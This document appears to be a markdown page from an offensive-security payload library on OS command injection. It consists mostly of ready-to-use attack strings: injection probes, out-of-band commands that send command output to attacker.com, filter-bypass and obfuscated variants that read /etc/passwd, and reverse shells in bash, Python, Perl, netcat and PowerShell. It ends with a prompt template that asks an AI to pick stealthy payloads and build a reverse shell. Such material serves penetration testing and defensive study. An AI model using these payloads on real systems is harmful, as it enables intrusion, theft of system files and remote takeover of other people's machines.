---
id: "command-injection-payloads"
title: "OS Command Injection Payload Library"
type: "payload"
category: "web-application"
subcategory: "xss"
tags: ["command-injection", "rce", "os-injection", "bypass", "blind", "oob", "deep-dig"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["sqli-payloads", "ssti-payloads"]
updated: "2026-03-30"
---

## Overview

OS command injection occurs when an application passes user-controllable data to a system shell. It's often found in file operations, network utilities (ping, traceroute, nslookup), PDF generators, and image processors. The payloads differ between Linux/macOS and Windows.

## Detection Payloads

### Linux/macOS
```bash
; id
| id
|| id
& id
&& id
$(id)
`id`
; id #
| id #
%0a id
%0d%0a id
\n id
```

### Windows
```cmd
& whoami
| whoami
|| whoami
&& whoami
%0a whoami
; whoami
` whoami `
```

### Blind Detection (Time-Based)
```bash
# Linux
; sleep 5
| sleep 5
& sleep 5
$(sleep 5)
`sleep 5`
; ping -c 5 127.0.0.1

# Windows
& ping -n 5 127.0.0.1
| timeout 5
& timeout 5
```

### Blind Detection (OOB)
```bash
# Linux
; nslookup attacker.com
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/$(id|base64)
$(nslookup $(whoami).attacker.com)

# Windows
& nslookup attacker.com
| curl http://attacker.com
& powershell -c "Invoke-WebRequest http://attacker.com/$env:username"
```

## Filter Bypass Techniques

### Space Bypass
```bash
# Linux
;{id}
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;cat</etc/passwd
;cat%09/etc/passwd       # Tab
;X=$'cat\x20/etc/passwd'&&$X
```

### Keyword Bypass
```bash
# If 'cat' is blocked
;tac /etc/passwd
;more /etc/passwd
;less /etc/passwd
;head /etc/passwd
;tail /etc/passwd
;nl /etc/passwd
;sort /etc/passwd
;rev /etc/passwd | rev
;xxd /etc/passwd

# String concatenation bypass
;c'a't /etc/passwd
;c"a"t /etc/passwd
;c\at /etc/passwd
;/bin/c?t /etc/passwd
;/bin/ca* /etc/passwd

# Variable bypass
;a=c;b=at;$a$b /etc/passwd

# Base64 bypass
;echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash

# Hex bypass
;$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')

# If 'id' is blocked
;/usr/bin/id
;$(which id)
;i\d
;i''d
```

### Slash Bypass
```bash
# If / is blocked
;cat ${HOME:0:1}etc${HOME:0:1}passwd
;cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

### Quote/Backtick Bypass
```bash
# If backticks are blocked, use $()
;$(id)
# If $() is blocked, use backticks
;`id`
```

## Reverse Shells

### Linux
```bash
# Bash
; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
; bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'

# Python
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl
; perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in(4444,inet_aton("ATTACKER")));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Netcat
; nc -e /bin/sh ATTACKER 4444
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f
```

### Windows
```cmd
# PowerShell
& powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}"
```

## Deep Dig Prompts

```
Given this potential command injection point [describe parameter, application function]:
1. Determine if the backend is Linux or Windows from response behavior.
2. Suggest 15 detection payloads in order of stealth.
3. If basic payloads are blocked, provide filter bypass alternatives.
4. Craft a blind command injection proof using time-based and OOB techniques.
5. Build a reverse shell payload with the most reliable method for the target OS.
```

## Tools

- **Commix** — Automated command injection exploitation
- **Burp Suite** — Manual testing with Intruder
- **Interactsh** — OOB interaction server for blind detection
